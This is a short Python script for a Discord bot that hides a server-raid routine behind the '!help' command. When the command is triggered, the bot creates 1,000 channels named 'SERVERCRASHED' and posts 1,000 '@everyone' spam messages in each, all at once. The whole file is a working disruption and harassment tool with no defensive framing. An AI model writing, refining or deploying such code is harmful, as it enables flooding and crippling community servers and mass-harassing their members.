import discord
from discord.ext import commands
import asyncio


intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)


token = 'your_bot_token'

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print(f'Connected to {len(bot.guilds)} guilds')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.content.startswith('!help'):
        await message.channel.send('Starting...')

        async def create_channel_and_send_messages(guild, index):
            channel = await guild.create_text_channel(f'SERVERCRASHED')
            for j in range(1000):  
                await channel.send(f'@everyone SERVER IS CRASHED')
        
        tasks = []
        for i in range(1000): 
            task = create_channel_and_send_messages(message.guild, i)
            tasks.append(task)
        
        await asyncio.gather(*tasks)
        await message.channel.send('Operation completed.')

bot.run(token)
